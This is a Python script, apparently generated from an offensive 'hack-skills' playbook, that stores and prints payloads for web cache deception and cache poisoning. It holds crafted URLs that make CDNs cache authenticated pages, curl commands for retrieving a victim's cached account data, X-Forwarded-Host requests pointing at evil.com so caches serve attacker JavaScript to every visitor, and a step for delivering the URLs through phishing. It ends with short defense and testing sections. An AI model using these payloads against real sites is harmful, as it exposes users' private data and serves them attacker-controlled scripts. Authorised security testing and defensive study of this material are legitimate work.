#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/web-cache-deception

Skill: SKILL: Web Cache Deception — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-web-cache-deception.py --help
      python hack-skills-web-cache-deception.py --list
      python hack-skills-web-cache-deception.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/web-cache-deception'
TITLE = 'SKILL: Web Cache Deception — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: web-cache-deception", "description: >-", "Web cache deception and poisoning playbook. Use when CDN, reverse proxy, or application caching may serve sensitive authenticated content to other users due to path confusion or cache key manipulation."],
    'skill-web-cache-deception-expert-attack-playbook': [],
    'advanced-reference': ["Also load [CACHE_POISONING_TECHNIQUES.md](./CACHE_POISONING_TECHNIQUES.md) when you need:", "- Web Cache Poisoning vs Web Cache Deception \u2014 clear distinction and attack flow comparison", "- Unkeyed header poisoning (X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL, multiple Host headers)", "- Unkeyed parameter poisoning (utm_content, fbclid, callback, reflected but not in cache key)", "- Fat GET cache poisoning (body parameters reflected but not keyed)", "- Parameter cloaking via semicolons and duplicate parameter parsing differentials", "- CDN-specific behavior: Cloudflare, CloudFront, Akamai, Varnish, Fastly (cache key composition, debug headers, ESI)", "- Vary header manipulation, cache partitioning attacks, and missing Vary vulnerabilities"],
    '1-core-concepts': [],
    'web-cache-deception-steal-authenticated-data': ["The attacker tricks a victim into requesting their authenticated page at a URL that the cache considers static:", "Victim visits: https://target.com/account/profile/nonexistent.css", "\u2192 Application ignores \"nonexistent.css\", serves /account/profile (with auth data)", "\u2192 CDN sees .css extension \u2192 caches the response", "\u2192 Attacker fetches: https://target.com/account/profile/nonexistent.css", "\u2192 CDN serves cached authenticated content \u2192 attacker reads victim's data"],
    'web-cache-poisoning-serve-malicious-content': ["The attacker manipulates unkeyed request components (headers, cookies) to make the cache store a malicious response:", "GET /page HTTP/1.1", "Host: target.com", "X-Forwarded-Host: evil.com", "\u2192 Application generates: <script src=\"https://evil.com/js/app.js\">", "\u2192 Cache stores this response", "\u2192 Normal users hit cache \u2192 load attacker's JavaScript"],
    '2-cache-deception-attack-methodology': [],
    'step-1-identify-cacheable-path-patterns': ["CDNs typically cache by file extension:", "```text", ".css  .js  .jpg  .png  .gif  .svg  .ico", ".woff .woff2  .ttf  .pdf  .json (sometimes)"],
    'step-2-test-path-confusion': ["```text"],
    'append-static-extension-to-authenticated-endpoint': ["https://target.com/api/me/info.css", "https://target.com/account/profile/x.js", "https://target.com/settings/avatar.png", "https://target.com/dashboard/data.json"],
    'path-traversal-style': ["https://target.com/account/profile/..%2fstatic/app.css"],
    'step-3-verify-caching': ["```bash"],
    'request-as-victim-authenticated': ["curl -H \"Cookie: session=VICTIM\" https://target.com/account/profile/x.css"],
    'check-response-headers': [],
    'x-cache-miss-first-request': [],
    'age-0': [],
    'request-again-as-attacker-no-auth': ["curl https://target.com/account/profile/x.css"],
    'check-response': [],
    'x-cache-hit': [],
    'contains-victim-s-authenticated-content-vulnerable': [],
    'step-4-deliver-to-victim': ["Send the crafted URL to victim via phishing, message, or embed:", "https://target.com/account/profile/tracking.gif"],
    '3-cache-poisoning-attack-methodology': [],
    'unkeyed-input-discovery': ["Cache keys typically include: `Host`, URL path, query string.", "These are typically NOT in the cache key: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, cookies, custom headers.", "```bash"],
    'test-if-x-forwarded-host-is-reflected-but-not-keyed': ["curl -H \"X-Forwarded-Host: evil.com\" https://target.com/page"],
    'if-response-contains-evil-com-and-caches-poisonable': [],
    'common-unkeyed-headers': ["```text", "X-Forwarded-Host      X-Forwarded-Scheme    X-Forwarded-Proto", "X-Original-URL        X-Rewrite-URL         X-Host", "X-Forwarded-Server    Forwarded             True-Client-IP"],
    'cache-poisoning-via-host-header': ["GET / HTTP/1.1", "Host: target.com", "X-Forwarded-Host: evil.com", "\u2192 Response: <link href=\"//evil.com/static/main.css\">", "\u2192 Cached \u2192 all users load attacker's CSS/JS"],
    '4-path-normalization-differences': ["The key to cache deception: **CDN and application normalize paths differently**.", "```text"],
    'application-treats-these-as-equivalent': ["/account/profile", "/account/profile/anything", "/account/profile/x.css", "/account/profile;.css"],
    'cdn-treats-css-as-cacheable-static-asset': ["\u2192 Mismatch = vulnerability"],
    '5-cache-poisoning-real-world-pattern': [],
    'x-forwarded-host-open-graph-meta-tag-injection': ["```text"],
    'target-page-uses-x-forwarded-host-to-generate-meta-tags': ["GET / HTTP/1.1", "Host: target.com", "X-Forwarded-Host: evil.com"],
    'response': ["<meta property=\"og:image\" content=\"https://evil.com/assets/logo.png\">"],
    'or': ["<link rel=\"canonical\" href=\"https://evil.com/\">"],
    'if-response-is-cached-all-users-see-evil-com-references': [],
    'impact-xss-via-injected-js-path-phishing-via-canonical-redirect-seo-hijack': [],
    'cache-deception-with-path-separator-tricks': ["```text"],
    'semicolon-treated-as-path-parameter-by-some-frameworks': ["/account/profile;.css"],
    'encoded-separators': ["/account/profile%2F.css"],
    'trailing-dot-space': ["/account/profile/.css", "/account/profile .css"],
    '6-defense': [],
    'for-cache-deception': ["- Cache only explicitly static paths (e.g., `/static/*`, `/assets/*`)", "- Never cache based on file extension alone", "- Set `Cache-Control: no-store, private` on authenticated endpoints", "- Use `Vary: Cookie` to prevent cross-user cache hits"],
    'for-cache-poisoning': ["- Include all reflected headers in cache key", "- Validate and sanitize `X-Forwarded-*` headers", "- Use `Cache-Control: no-cache` for dynamic content", "- Strip unknown headers at CDN edge"],
    '6-testing-checklist': ["\u25a1 Identify CDN/cache layer (X-Cache, Age, Via headers)", "\u25a1 Append .css/.js/.png to authenticated API endpoints", "\u25a1 Check if response is cached (X-Cache: HIT on second request)", "\u25a1 Test path separators: /x.css, ;.css, %2F.css", "\u25a1 Test unkeyed headers: X-Forwarded-Host, X-Original-URL", "\u25a1 Verify Cache-Control headers on sensitive endpoints", "\u25a1 Check Vary header presence", "\u25a1 Test with and without authentication"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()